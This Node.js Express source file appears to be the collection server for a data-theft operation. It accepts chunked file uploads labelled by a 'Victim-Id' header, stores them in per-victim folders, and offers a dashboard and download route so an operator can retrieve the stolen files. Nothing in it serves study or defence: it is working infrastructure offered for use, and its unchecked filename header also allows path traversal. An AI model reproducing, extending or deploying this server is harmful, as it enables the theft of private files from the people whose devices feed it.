const fs = require('fs');
require('dotenv').config();
const cors = require('cors');
const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 8080;

const corsOptions = {
  origin: ['https://deobfrontend-4mu41vc3s-2naseernoors-projects.vercel.app', 'https://deobfrontend-git-main-2naseernoors-projects.vercel.app'],
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Victim-Id', 'Filename', 'Chunk-Index', 'Total-Chunks'],
  credentials: true,
};
app.use(cors(corsOptions));

app.use((req, res, next) => {
  console.log('📥 Request:', req.method, req.url, 'Headers:', req.headers);
  next();
});

app.options('/upload', (req, res) => {
  res.header('Access-Control-Allow-Origin', corsOptions.origin);
  res.header('Access-Control-Allow-Methods', corsOptions.methods.join(', '));
  res.header('Access-Control-Allow-Headers', corsOptions.allowedHeaders.join(', '));
  res.header('Access-Control-Allow-Credentials', 'true');
  res.status(204).end();
});

app.use('/dashboard', express.static(path.join(__dirname, 'dashboard')));

app.get('/dashboard/', (req, res) => {
  res.sendFile(path.join(__dirname, 'dashboard', 'index.html'));
});

app.use(express.raw({ type: 'application/octet-stream', limit: '100mb' }));

const OUTPUT_BASE_DIR = path.join(__dirname, 'received_files');
if (!fs.existsSync(OUTPUT_BASE_DIR)) {
  fs.mkdirSync(OUTPUT_BASE_DIR, { recursive: true });
}

const victimFolders = {};
const victimFileCounts = {};
const victimTotalFiles = {};
const connectedDevices = {};

async function checkAndSendEmail(victimId, victimFolder) {
  const filesInFolder = fs.readdirSync(victimFolder);
  if (filesInFolder.length === victimTotalFiles[victimId]) {
    console.log(`✅ All files received for victim ${victimId}`);
  }
}

app.post('/upload', (req, res) => {
  try {
    const filename = decodeURIComponent(req.headers['filename']);
    const victimId = decodeURIComponent(req.headers['victim-id']);
    const chunkIndex = parseInt(req.headers['chunk-index']);
    const totalChunks = parseInt(req.headers['total-chunks']);
    const ip = req.ip;

    if (!filename || !victimId || isNaN(chunkIndex) || isNaN(totalChunks)) {
      return res.status(400).json({ error: 'Missing or invalid headers' });
    }

    if (!victimFolders[victimId]) {
      const timestamp = new Date().toISOString().replace(/:/g, '-');
      victimFolders[victimId] = path.join(OUTPUT_BASE_DIR, `${victimId}_${timestamp}`);
      fs.mkdirSync(victimFolders[victimId], { recursive: true });
      victimTotalFiles[victimId] = totalChunks;
      victimFileCounts[victimId] = {};
    }

    const victimFolder = victimFolders[victimId];
    const filePath = path.join(victimFolder, filename);

    if (!victimFileCounts[victimId][filename]) {
      victimFileCounts[victimId][filename] = new Set();
    }

    if (victimFileCounts[victimId][filename].has(chunkIndex)) {
      console.log(`⏭️ Skipping duplicate chunk: ${chunkIndex} of ${totalChunks} for ${filename}`);
      return res.status(200).json({ message: 'Duplicate chunk skipped' });
    }

    fs.appendFile(filePath, req.body, (err) => {
      if (err) {
        console.error(`❌ Error writing file:`, err);
        return res.status(500).json({ error: 'Error saving file' });
      }

      console.log(`✅ Chunk ${chunkIndex} of ${totalChunks} received for ${filename}`);
      victimFileCounts[victimId][filename].add(chunkIndex);

      if (victimFileCounts[victimId][filename].size === totalChunks) {
        console.log(`✅ File upload complete: ${filename}`);
        checkAndSendEmail(victimId, victimFolder);
      }

      res.status(200).json({ message: 'Chunk received successfully' });
    });
  } catch (error) {
    console.error(`❌ Error handling upload:`, error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/dashboard-data', (req, res) => {
  res.json(connectedDevices);
});

app.get('/download/:victimId/:filename', (req, res) => {
  try {
    const { victimId, filename } = req.params;
    if (!victimFolders[victimId]) {
      return res.status(404).json({ error: 'Victim folder not found' });
    }
    const victimFolder = victimFolders[victimId];
    const filePath = path.join(victimFolder, filename);
    if (!fs.existsSync(filePath)) {
      return res.status(404).json({ error: 'File not found' });
    }
    res.download(filePath, filename, (err) => {
      if (err) {
        console.error(`❌ Error sending file:`, err);
        res.status(500).json({ error: 'Error sending file' });
      }
    });
  } catch (error) {
    console.error(`❌ Error in download route:`, error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
